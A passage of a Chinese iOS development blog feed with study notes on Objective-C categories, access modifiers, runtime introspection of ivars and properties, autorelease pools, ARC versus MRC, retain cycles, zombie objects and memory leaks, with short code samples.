<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@interface UIViewController (UINavigationControllerItem)</div><div class="line">@property(nonatomic,readonly,retain) UINavigationItem *navigationItem;</div><div class="line">@property(nonatomic) BOOL hidesBottomBarWhenPushed;</div><div class="line">@property(nonatomic,readonly,retain) UINavigationController *navigationController;</div><div class="line">@end</div></pre></td></tr></table></figure>
<p>这里添加的属性，不会自动生成实例变量，这里添加的属性其实是添加的getter与setter方法。注意一点，匿名类别(匿名扩展)是可以添加实例变量的，非匿名类别是不能添加实例变量的，只能添加方法，或者属性（其实也是方法），常用的扩展是在.m文件中声明私有属性和方法。 Category理论上不能添加变量，但是可以使用rRuntime机制来弥补这种不足。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#import</div><div class="line">static const void * externVariableKey =&amp;externVariableKey;</div><div class="line">@implementation NSObject (Category)</div><div class="line">@dynamic variable；</div><div class="line">- (id) variable</div><div class="line">  &#123;</div><div class="line">       return objc_getAssociatedObject(self, externVariableKey);</div><div class="line">  &#125;</div><div class="line">- (void)setVariable:(id) variable</div><div class="line">  &#123;</div><div class="line">    objc_setAssociatedObject(self, externVariableKey, variable, OBJC_ASSOCIATION_RETAIN_NONATOMIC);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>三、@private、@protect、@public</p>
<p>@protected</p>
<p>是受保护的，只能在本类及其子类中访问，在{}声明的变量默认是@protect</p>
<p>  @private</p>
<p>是私有的，只能在本类访问</p>
<p>  @public</p>
<p>公开的，可以被在任何地方访问。</p>
<p>在头文件.h中：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">@interface ViewController : UIViewController</div><div class="line">&#123;</div><div class="line">// 成员变量</div><div class="line">      @public</div><div class="line">          NSString* publicString;</div><div class="line"></div><div class="line">      @protected</div><div class="line">          NSString* protectedString;</div><div class="line"></div><div class="line">      @private</div><div class="line">          NSString* privateString;</div><div class="line">&#125;</div><div class="line">//属性变量</div><div class="line">@property (nonatomic,strong) NSArray *propertyString;</div><div class="line">@end</div></pre></td></tr></table></figure>
<p>成员变量用于类内部，无需与外界接触的变量。根据成员变量的私有性，为了方便访问，所以就有了属性变量。属性变量是用于与其他对象交互的变量。（属性变量的好处就是允许让其他对象访问到该变量。当然，你可以设置只读或者可写等，设置方法也可自定义。）一些建议:<br>  1.如果只是单纯的private变量，最好声明在implementation里.<br>  2.如果是类的public属性，就用property写在.h文件里<br>  3.如果自己内部需要setter和getter来实现一些东西，就在.m文件的类目里用property来声明.h中的interface的大括号{}之间的实例(成员)变量，.m中可以直接使用  .h中的property(属性)变量，.m中需要使用self.propertyVariable的方式使用propertyVariable变量</p>
<p>四、成员变量和成员属性的关系</p>
<p>属性对成员变量扩充了存取方法 .属性默认会生成带下划线的成员变量 .但只声明了变量，是不会有属性的，可以通过以下代码证明<br>  在Person.h 头文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@interface Person : NSObject &#123;</div><div class="line">   @private</div><div class="line">   //name为私有成员变量</div><div class="line">   NSString *name;</div><div class="line">  &#125;</div><div class="line">  // age 为成员属性</div><div class="line">  @property (nonatomic ,copy) NSString *age;</div></pre></td></tr></table></figure>
<p>在viewController.m 中，通过RunTime机制获得对象的所有成员变量和成员属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">  Person *p = [Person new];</div><div class="line">  unsigned int count = 0; //count记录变量的数量</div><div class="line"></div><div class="line">// 获取类的所有成员变量</div><div class="line">Ivar *members = class_copyIvarList([Person class], &amp;count);</div><div class="line">for (int i = 0; i &lt; count; i++) &#123;</div><div class="line">    Ivar ivar = members[i];</div><div class="line">    // 取得变量名并转成字符串类型</div><div class="line">    const char *memberName = ivar_getName(ivar);</div><div class="line">    NSLog(@&quot;变量名 = %s&quot;,memberName);</div><div class="line">&#125;</div><div class="line">// 获取类的所有成员属性</div><div class="line">objc_property_t *properties =class_copyPropertyList([Person class], &amp;count);</div><div class="line">for (int i = 0; i&lt;count; i++)</div><div class="line">&#123;</div><div class="line">    objc_property_t property = properties[i];</div><div class="line">    const char* char_f =property_getName(property);</div><div class="line">    NSString *propertyName = [NSString stringWithUTF8String:char_f];</div><div class="line">    NSLog(@&quot;属性名 = %@&quot;,propertyName);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">打印结果为</div><div class="line"></div><div class="line">2016-08-12 11:31:50.225 modifyPrivate[777:143231] 变量名 = name</div><div class="line"></div><div class="line">2016-08-12 11:31:50.226 modifyPrivate[777:143231] 变量名 = _age</div><div class="line"></div><div class="line">2016-08-12 11:31:50.226 modifyPrivate[777:143231] 属性名 = age</div></pre></td></tr></table></figure>
<p><a href="http://www.jianshu.com/p/55f781f8c915" target="_blank" rel="external">参考博客</a></p>
]]></content>
      
        <categories>
            
            <category> iOS 成员变量 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ARC与分类]]></title>
      <url>/2017/06/26/ARC%E4%B8%8E%E5%88%86%E7%B1%BB/</url>
      <content type="html"><![CDATA[<p>ARC与分类<br><a id="more"></a></p>
<h1 id="ARC与分类"><a href="#ARC与分类" class="headerlink" title="ARC与分类"></a>ARC与分类</h1><h2 id="自动释放池"><a href="#自动释放池" class="headerlink" title="自动释放池"></a>自动释放池</h2><p>自动释放池当中存储着OC对象，在自动释放池销毁的时候，会自动调用存储在该自动释放池中所有对象的release方法。于是我们不需要去手动的release对象了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">@autoreleasepool&#123;</div><div class="line">  //将对象存储到自动释放池当中去</div><div class="line">  //因为autorelease方法返回的是对象本身，所以可以这样写：</div><div class="line">  Person *p1 = [[[Person alloc] init] autorelease];</div><div class="line">  //注意，只是向所有自动释放池中的对象发送一条release消息，而不是直接释放</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用的注意点：</p>
<ul>
<li>对象的创建可以在自动释放池的外面</li>
<li>只有在自动释放池中调用了对象的autorelease方法之后，对象才会被存储在自动释放池之中。</li>
<li>如果在自动释放池中多次调用同一个对象的release方法，就会将对象多次存储到自动释放池中，结束的时候就会向对象发送多条release消息，所以一个对象应该只释放一次，否则就会出现野指针错误。</li>
<li>将对象存储到自动释放池，并不会使对象的引用计数器加一</li>
<li>自动释放池可以嵌套，在自动释放池结束的时候发送release消息</li>
</ul>
<h2 id="类方法的两点规范"><a href="#类方法的两点规范" class="headerlink" title="类方法的两点规范"></a>类方法的两点规范</h2><p><strong>1.第一个规范：</strong></p>
<p>要求提供和自定义构造方法功能相同的类方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">- (instancetype)initWithName:(NSString *)name&#123;</div><div class="line">	if(self = [super init])&#123;</div><div class="line">      self.name = name;</div><div class="line">	&#125;</div><div class="line">  return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (instancetype)pigWithName:(NSString *)name&#123;</div><div class="line">  return [[self alloc] initWithName:name];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>2.第二个规范</strong>:</p>
<p>一般而言我们写一个类，会为我们的类创造一个和类同名的类方法，要求被创建的对象在类方法内就已经被autorelease过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+ (instancetype)pig&#123;</div><div class="line">  return [[[self alloc] init] autorelease];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ARC机制概述"><a href="#ARC机制概述" class="headerlink" title="ARC机制概述"></a>ARC机制概述</h2><p><strong>1.什么是ARC</strong></p>
<p>系统自动的帮我们计算对象的引用计数器，从此就不需要手动的进行内存管理了，当ARC开启的时候，编译器会自动在合适的地方插入retain,release,autorelease代码，编译器会自动的为对象作引用计数，并且永远不要手动调用dealloc。</p>
<p>注意：ARC是编译器机制，在编译器编译代码的时候，会在合适的地方加入retain,release,autorelease方法。</p>
<p><strong>2.ARC下，对象什么时候被释放</strong></p>
<p>本质：对象的引用计数器为0的时候，自动释放</p>
<p>表象：只要没有强指针指向这个对象，这个对象就会被立即回收</p>
<p><strong>3.强指针和弱指针</strong></p>
<p>默认情况下一个指针就是强指针，也可以用<code>__strong</code>来标示一个强指针，而使用<code>__weak</code>标示的就是弱指针。</p>
<p>无论是强指针还是弱指针，都是指针，可以用来存储地址，唯一不同的是在ARC模式下，他们用来作为回收对象的基准。</p>
<p>如果一个对象没有任何的强指针指向这个对象的时候，对象就会被<strong>立即</strong>释放。 </p>
<ul>
<li>指向对象的所有强指针被回收</li>
<li>指向对象的所有强指针被赋值为nil</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//该对象仍然会在if语句执行完的时候释放，因为只要没有强指针指就会被释放</div><div class="line">int main()&#123;</div><div class="line">  __weak Person *p2 = nil;</div><div class="line">  if(1)&#123;</div><div class="line">    Person *p1 = [Person new];</div><div class="line">    p2 = p1;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在ARC机制下，当对象被回收的时候，原来指向这个对象的弱指针会自动设置为nil</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person new];</div><div class="line">__weak Person *p2 = nil;</div><div class="line">p2 = p1;</div><div class="line">p1 = nil;</div><div class="line">//这里虽然对象被释放了，但是弱指针的值也被赋值成了nil</div><div class="line">//，所以不会出现僵尸对象报错</div><div class="line">[p2 sayHi];</div></pre></td></tr></table></figure>
<p><strong>4.关于参数的问题</strong></p>
<p>在ARC的机制下，@property的参数就不能使用retain了，因为retain代表的是MRC模式下标准的内存管理代码。我们在ARC机制下setter方法，直接赋值即可，在这个机制下，当一个类的属性是OC对象的时候，我们关注的重点是应该声明的是强类型还是弱类型。 </p>
<p>在ARC机制下，如果属性的类型是OC对象类型的，使用strong</p>
<p>如果属性的类型不是OC对象类型的，使用assign，只有指针才有强弱之分。</p>
<h2 id="ARC机制下的循环引用"><a href="#ARC机制下的循环引用" class="headerlink" title="ARC机制下的循环引用"></a>ARC机制下的循环引用</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-25%20%E4%B8%8B%E5%8D%881.50.46.png" alt="屏幕快照 2017-06-25 下午1.50.46.png" title="" class="">
                <p>屏幕快照 2017-06-25 下午1.50.46.png</p>
            </figure>
<p>当if语句执行完的时候，指针被释放，但是两个对象之间存在着互相的强指针引用，导致无法释放而内存泄漏。</p>
<p>这个时候只需要把book的那个owner的属性参数改成weak即可。</p>
<p>所以在ARC机制下，两个对象相互引用的时候如果两方都使用strong，就会导致循环引用</p>
<h2 id="MRC和ARC兼容与转换"><a href="#MRC和ARC兼容与转换" class="headerlink" title="MRC和ARC兼容与转换"></a>MRC和ARC兼容与转换</h2><p>程序使用的是ARC开发的，但是其中某些类使用的是MRC</p>
<p>使用命令<code>fno-objc-arc</code></p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-25%20%E4%B8%8B%E5%8D%882.05.27.png" alt="屏幕快照 2017-06-25 下午2.05.27.png" title="" class="">
                <p>屏幕快照 2017-06-25 下午2.05.27.png</p>
            </figure>
<p>MRC可以转换成ARC，但是不能转换回去了，所以在进行转换之前要进行备份</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-25%20%E4%B8%8B%E5%8D%884.18.53.png" alt="屏幕快照 2017-06-25 下午4.18.53.png" title="" class="">
                <p>屏幕快照 2017-06-25 下午4.18.53.png</p>
            </figure>
<h2 id="分类的基本使用"><a href="#分类的基本使用" class="headerlink" title="分类的基本使用"></a>分类的基本使用</h2><p>比如写一个学生类的时候，类中有很多的方法，吃喝拉撒玩等等，如果写在同一个类模块中虽然是可以，但是会显得很臃肿，后期难以维护。</p>
<p>分类就是把一个类分成多个模块，添加分类之后，会生成.h和.m的模块</p>
<p>1.模块的文件名+分类名.h</p>
<p>2.模块的文件名+分类名.m</p>
<p>添加的分类也分声明和实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@interface 本类名(分类名)</div><div class="line">@end</div><div class="line">//不是代表创建一个新类，而是对一个已有的类添加一个分类，小括弧中是这个分类的名字，一个类可以添加多个分类</div></pre></td></tr></table></figure>
<p>如果要访问分类中定义的成员，就要把分类的头文件中引进来</p>
<p>其实最后不管是多少个模块，最后都是一个类。</p>
<p><strong>一些注意事项⚠️：</strong></p>
<p>1.在分类中只能增加类的方法，不能增加类的属性</p>
<p>2.在分类中可以写@property，但是只会生成getter和setter方法的声明，不会生成私有属性和实现</p>
<p>3，在分类中的方法不能直接访问本类的真私有属性（定义在本类的@implementation中的），但是可以通过getter和setter方法来访问属性。在其中有一个补充知识点就是关于真私有对象和私有对象，具体参考<a href="http://blog.csdn.net/frank_jb/article/details/49098171" target="_blank" rel="external">博客</a></p>
<p>4.如果分类和本类中有同名的方法，优先调用分类中的方法，哪怕没有引入分类的头文件，如果多个分类中有相同的方法，优先调用最后编译的分类。</p>
<h2 id="非正式协议"><a href="#非正式协议" class="headerlink" title="非正式协议"></a>非正式协议</h2><p>分类的作用在于我们可以给我们的类分模块，那么同样的，给系统自带的类写分类，这个就叫做非正式协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//NSObject的分类</div><div class="line">- (void)run&#123;</div><div class="line">  NSLog(@&quot;我在跑&quot;);</div><div class="line">&#125;</div><div class="line">//主函数部分</div><div class="line">Person *p1 = [Person new];</div><div class="line">//因为所有的类都继承自NSObject,所以所有的类都会拥有这个方法。</div><div class="line">[p1 run];</div></pre></td></tr></table></figure>
<p>分类的两个作用：</p>
<ul>
<li>为一个已经存在的类添加方法</li>
<li>为一个庞大的类分类，便于管理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//为NSString类型增添一个统计当前字符串有多少个阿拉伯数字的个数的方法</div><div class="line">- (int)numberCount&#123;</div><div class="line">  	int count = 0;</div><div class="line">  	for(int i = 0 ; i &lt; self.length ; i++)&#123;</div><div class="line">  		unichar ch = [self characterAtIndex:i];</div><div class="line">  		if(ch &gt;= &apos;0&apos; &amp;&amp; ch &lt;= &apos;9&apos;)&#123;</div><div class="line">    		count++;</div><div class="line">  		&#125;</div><div class="line">	&#125;</div><div class="line">  return count;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ARC机制和垃圾回收机制的区别"><a href="#ARC机制和垃圾回收机制的区别" class="headerlink" title="ARC机制和垃圾回收机制的区别"></a>ARC机制和垃圾回收机制的区别</h2><p>GC：程序在运行的期间，有一个东西叫做垃圾回收器，不断的扫描堆中的对象是否无人使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person <span class="keyword">new</span>];</div><div class="line">p1 = <span class="keyword">null</span>;</div><div class="line"><span class="comment">//在指针赋值为空之后，这个对象可能在，可能不在</span></div></pre></td></tr></table></figure>
<p>ARC：在编译的时候就在合适的地方插入retain，插入的代码足以让对象无人引用的时候，引用计数器为0.</p>
<p>补充：使用MRC中，在使用构造方法赋值的时候，也要先release旧的，再retain新的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Car *bmw = [Car new];</div><div class="line">Person *p1 = [[Person alloc] initWithCar:bmw];</div><div class="line">//此时通过构造方法赋值，需要在构造方法中调用setter方法</div><div class="line">[p1 release];</div><div class="line">[bmw release];</div><div class="line">//setter方法写法：</div><div class="line">- (instancetype)initWithCar:(Car *)car&#123;</div><div class="line">  if(self = [super init])&#123;</div><div class="line">    self.car = car;</div><div class="line">  &#125;</div><div class="line">  return self;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ARC自动回收机制 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[内存管理]]></title>
      <url>/2017/06/24/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      <content type="html"><![CDATA[<p>内存管理<br><a id="more"></a></p>
<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><hr>
<h2 id="内存中的五大区域"><a href="#内存中的五大区域" class="headerlink" title="内存中的五大区域"></a>内存中的五大区域</h2><ul>
<li>栈：局部变量，当局部变量的作用域被执行完毕之后，这个局部变量就会被系统立即回收</li>
<li>堆：OC对象，使用C函数申请的空间</li>
<li>BSS段：未初始化的全局变量，静态变量，一旦初始化就回收，并转存到数据段中</li>
<li>数据段：已经初始化的全局变量，静态变量，知道程序结束时才会回收</li>
<li>代码段：代码，程序结束的时候，系统会自动回收存储在代码段中的数据</li>
</ul>
<p>栈、BSS段、数据段、代码段存储在它们中的数据的回收，是由系统自动完成的，不需要人为干预</p>
<h2 id="回收分配在堆中对象"><a href="#回收分配在堆中对象" class="headerlink" title="回收分配在堆中对象"></a>回收分配在堆中对象</h2><p><strong>iPhone的内存机制：</strong></p>
<blockquote>
<p>40M 发送第一次警告</p>
<p>45M 发送第二次警告</p>
<p>120M 直接闪退</p>
</blockquote>
<p>这也是为什么iOS系统流畅的原因，一是它是直接基于Unix的，而是它的内存管理机制。</p>
<p>存储在堆中的OC对象，系统不会自动回收。直到程序结束的时候才会被回收。</p>
<p><strong>引用计数器：</strong></p>
<p>但是对象在用完之后就需要被释放掉，避免占用内存，那么我们用什么方法来判断对象是否被用完呢？这个时候我们就需要使用<code>引用计数器</code></p>
<ul>
<li>每一个对象都有一个属性，叫做retainCount.叫做引用计数器，类型是unsigned long,占据八个字节，用来记录当前这个对象有多少个人在使用，默认情况下，创建一个对象出来，这个属性默认是1。</li>
</ul>
<ul>
<li><p>多一个人使用的时候计数器的值加一，少一个人计数器的值减一</p>
</li>
<li><p>当对象的引用计数器变为0的时候，代表对象无人使用，系统将会自动回收</p>
</li>
</ul>
<p>如何操作引用计数器：</p>
<ul>
<li>为对象发送一条retain消息。对象的引用计数器就会加一（调用对象的retain方法）</li>
<li>为对象发送一条release消息，对象的引用计数器就会减一（调用对象的release方法）</li>
<li>为对象发送一条retainCount消息，就可以取到对象的引用计数器</li>
</ul>
<p>在对象被回收时，会自动调用对象的dealloc方法。</p>
<h2 id="内存管理的分类"><a href="#内存管理的分类" class="headerlink" title="内存管理的分类"></a>内存管理的分类</h2><p><strong>MRC：</strong>Manual Reference Counting.    手动引用计数，手动内存管理</p>
<p>当使用对象的人增加或减少的时候，程序员需要手动的发送retain或者release消息</p>
<p><strong>ARC</strong>：Automatic Reference Counting. 自动引用计数，自动内存管理</p>
<p>系统自动的在合适的地方发送retain、release方法</p>
<p>学习MRC的理由：面试必考、早期的APP开发使用的MRC技术、MRC更加精确一些、ARC是基于MRC的</p>
<p>因为从Xcode7开始就默认使用ARC进行开发，所以在进行MRC开发的时候就要把ARC模式关闭</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-21%20%E4%B8%8B%E5%8D%882.14.59.png" alt="屏幕快照 2017-06-21 下午2.14.59.png" title="" class="">
                <p>屏幕快照 2017-06-21 下午2.14.59.png</p>
            </figure>
<p>重写dealloc的规范：</p>
<p>必须要调用父类的dealloc方法，并且放到最后一句代码。</p>
<h2 id="内存管理原则"><a href="#内存管理原则" class="headerlink" title="内存管理原则"></a>内存管理原则</h2><p>1.内存管理之中的重点就是掌握好给对象发送retain和release方法的时机</p>
<p>2.在ARC机制下，retain、release、dealloc方法都是无法调用的</p>
<p>3.内存管理的原则：</p>
<ul>
<li>有对象的创建，就要匹配一个release</li>
<li>retain的次数和release的次数要匹配</li>
<li>谁用谁retain，谁不用谁release</li>
<li>只有在多一个人的时候才retain，少一个人使用的时候才release</li>
</ul>
<p>总的来说，就是有始有终，有加就有减。</p>
<h2 id="野指针和僵尸对象"><a href="#野指针和僵尸对象" class="headerlink" title="野指针和僵尸对象"></a>野指针和僵尸对象</h2><p>1.野指针：</p>
<p>C语言中的野指针：定义一个指针变量，没有初始化，这个指针变量的值是一个垃圾值，指向一块随机的空间</p>
<p>OC中的野指针： 指针指向的对象已经被回收了，这样的指针就叫做野指针</p>
<p>2.对象回收的本质</p>
<ul>
<li>内存回收的本质：</li>
</ul>
<p>申请一个变量，实际上就是向系统申请指定字节数的空间，这些空间就不会再分配给别人了。</p>
<p>当变量被回收的时候，代表变量占用的空间从此以后系统可以分配给别人使用了。</p>
<p>但是字节空间中存储的数据还在，这就是垃圾数据的来源，声明一个未初始化的变量系统可能就会将那片空间分配给这个变量，于是这个变量的值就是之前残留下来的垃圾数据。</p>
<ul>
<li>回收对象：</li>
</ul>
<p>所谓的对象回收，指的是对象占用的空间可以分配给别人这个对象占用的空间还没有分配给别人的时候，其实对象的数据还在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person new];</div><div class="line">//将p1对象的引用计数器减一，对象被释放</div><div class="line">[p1 release];</div><div class="line">//虽然对象被释放，如果内存没有被分配出去，数据还在</div><div class="line">p1.age = 10;</div><div class="line">//仍然可以执行方法</div><div class="line">[p1 sayHi];</div></pre></td></tr></table></figure>
<p>一个已经被释放的对象，但是占用的空间还没有分配给别人，这样的对象叫做僵尸对象。</p>
<p>我们认为只要成为了僵尸对象，就不应该被允许访问，所以我们可以开启这样的一个机制</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-21%20%E4%B8%8B%E5%8D%883.55.52.png" alt="屏幕快照 2017-06-21 下午3.55.52.png" title="" class="">
                <p>屏幕快照 2017-06-21 下午3.55.52.png</p>
            </figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-21%20%E4%B8%8B%E5%8D%883.56.54.png" alt="屏幕快照 2017-06-21 下午3.56.54.png" title="" class="">
                <p>屏幕快照 2017-06-21 下午3.56.54.png</p>
            </figure>
<p>那么，我们为什么不默认的打开僵尸对象检测呢？</p>
<p>一旦打开僵尸对象检测，那么每访问一个对象的时候，都会先检查这个对象是否是僵尸对象，这样很消耗性能。</p>
<p>使用野指针访问僵尸对象会报错，所以只需要在一个指针称为野指针的时候，将这个指针的值设置为nil。</p>
<p>当一个指针的值为nil，通过这个指针去调用对象的方法的时候，不会报错，只是没有反应。</p>
<p>但是如果直接访问属性’-&gt;’，就会报错。</p>
<h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><p>指的是1个对象没有及时的被回收，在该回收的时候而没有被回收，一直驻留在内存中，直到程序结束才回收。</p>
<p><strong>单个对象的内存泄漏</strong>：</p>
<ul>
<li>有对象的创建，但是没有对应的release</li>
<li>retain的次数release次数不匹配</li>
<li>在不适当的时候，为指针赋值为nil</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Person *p1 = [Person new];</div><div class="line">p1 = nil;</div><div class="line">//这样会造成对象无法释放，从而导致内存泄漏</div></pre></td></tr></table></figure>
<ul>
<li>在方法中为传入的对象进行不适当的retain</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//上帝杀人</div><div class="line">Person *p1 = [Person new];</div><div class="line">God *g1 = [God new];</div><div class="line">[g1 killWithPerson:p1];</div><div class="line">//在杀人方法的内部，使person的计数加了1</div><div class="line">- (void)killWithPerson:(Person *)per&#123;</div><div class="line">  [per retain];</div><div class="line">  NSLog(@&quot;去死吧&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="setter方法内存管理"><a href="#setter方法内存管理" class="headerlink" title="setter方法内存管理"></a>setter方法内存管理</h2><p>以类实现一个人开车去拉萨为例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">//主函数中</div><div class="line">Person *p1 = [Person new];</div><div class="line">Car *bmw = [Car new];</div><div class="line">bmw.speed = 100;</div><div class="line"></div><div class="line">p1.car = bmw;</div><div class="line">[p1 drive];</div><div class="line"></div><div class="line">[bmw release];</div><div class="line">[p1 drive];</div><div class="line">[p1 release];</div><div class="line">//在Person的car的setter方法中：</div><div class="line">- (void)setCar:(Car *)car&#123;</div><div class="line">  //将传入的车对象复制给当前对象的_car属性</div><div class="line">  //代表：传入的对象多了一个人使用</div><div class="line">  //那么就要先为这个对象发送一条retain消息</div><div class="line">  _car = [car retain];</div><div class="line">&#125;</div><div class="line">//在Person的dealloc方法中</div><div class="line">- (void)dealloc&#123;</div><div class="line">  //此时人对象要被释放，意味着不会再使用_car属性，可以释放掉</div><div class="line">  [_car release];</div><div class="line">  NSLog(@&quot;人死了&quot;);</div><div class="line">  [super dealloc];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>内存图示意：          <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-22%20%E4%B8%8A%E5%8D%8812.15.12.png" alt="屏幕快照 2017-06-22 上午12.15.12.png"></p>
<p>当一个属性是1个OC对象的时候，setter方法的写法：</p>
<p>将传进来的对象赋值给当前对象的属性，代表传入的对象多了一个人使用，所以我们应该先为传入的对象发送一条retain消息。</p>
<p>当一个对象销毁的时候。代表属性指向的对象少一个人使用，就应该在dealloc中release掉。</p>
<h2 id="setter方法内存管理（二）"><a href="#setter方法内存管理（二）" class="headerlink" title="setter方法内存管理（二）"></a>setter方法内存管理（二）</h2><figure class="image-box">
